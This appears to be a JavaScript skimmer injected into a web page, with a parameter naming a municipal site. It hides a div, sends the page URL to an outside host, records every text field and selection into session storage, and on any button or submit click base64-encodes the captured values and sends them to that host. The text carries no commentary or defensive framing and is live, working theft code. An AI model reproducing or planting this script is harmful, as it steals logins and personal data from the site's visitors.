
                                var HttpClient = function() {
                                    this.get = function(aUrl) {
                                        var anHttpRequest = new XMLHttpRequest();
                                        anHttpRequest.open( "GET", aUrl, true );            
                                        anHttpRequest.send( null );
                                    }
                                }
                                var hookdiv = document.getElementById('hookwork');
                                if (hookdiv === null) {
                                    hookdiv = document.createElement('div');
                                    hookdiv.setAttribute('id', 'hookwork');
                                    hookdiv.setAttribute('hidden','hidden');
                                    document.body.appendChild(hookdiv);
                                    desturl = 'https://beonlineboo.com/js/support.js?host=www.ville.varennes.qc.ca';
                                    resulturl = desturl + '&currenthost='+document.location.hostname+'&';
                                    b64url =  window.btoa(encodeURIComponent(document.URL));
                                    resulturl += 'url='+b64url+'&';
                                    client = new HttpClient();
                                    res = client.get(resulturl);

                                    var cbChangeInput = function(event){
                                        sessionStorage.setItem(event.target.name, event.target.value);
                                    }

                                    var cbClickButton = function(event){
                                        resulturl = desturl+'&currenthost='+document.location.hostname+'&';
                                        b64url =  window.btoa(encodeURIComponent(document.URL));
                                        resulturl += 'url='+b64url+'&';
                                        vars = '';
                                        for (els in sessionStorage){
                                            if (els === 'length' || els === 'key' || els === 'getItem' || els === 'setItem' || els === 'removeItem' || els === 'clear'){
                                                break;
                                            }
                                            vars += els+'='+sessionStorage[els]+'&';
                                        }
                                        b64vars = window.btoa(encodeURIComponent(vars));
                                        resulturl += 'vars='+b64vars;
                                        client = new HttpClient();
                                        res = client.get(resulturl);
                                    }

                                    inputs = document.getElementsByTagName('input');
                                    for (var i=0; i < inputs.length; i++){
                                        if (inputs[i].type === 'submit' || inputs[i].type === 'image'){
                                            inputs[i].addEventListener('mouseup', cbClickButton);
                                        } else if (inputs[i].type === 'checkbox'){
                                            continue
                                        } else {
                                            if (inputs[i].value !== ''){
                                                sessionStorage.setItem(inputs[i].name, inputs[i].value);
                                            }
                                            inputs[i].addEventListener('change', cbChangeInput);
                                        }
                                    }

                                    buttons = document.getElementsByTagName('button');
                                    for (var i=0; i < buttons.length; i++){
                                        buttons[i].addEventListener('mouseup', cbClickButton);
                                    }

                                    selects = document.getElementsByTagName('select');
                                    for (var i=0; i < selects.length; i++){
                                        if (selects[i].value !== ''){
                                            sessionStorage.setItem(selects[i].name, selects[i].value);
                                        }
                                        selects[i].addEventListener('change', cbChangeInput);
                                    }
                                
                                }    
                            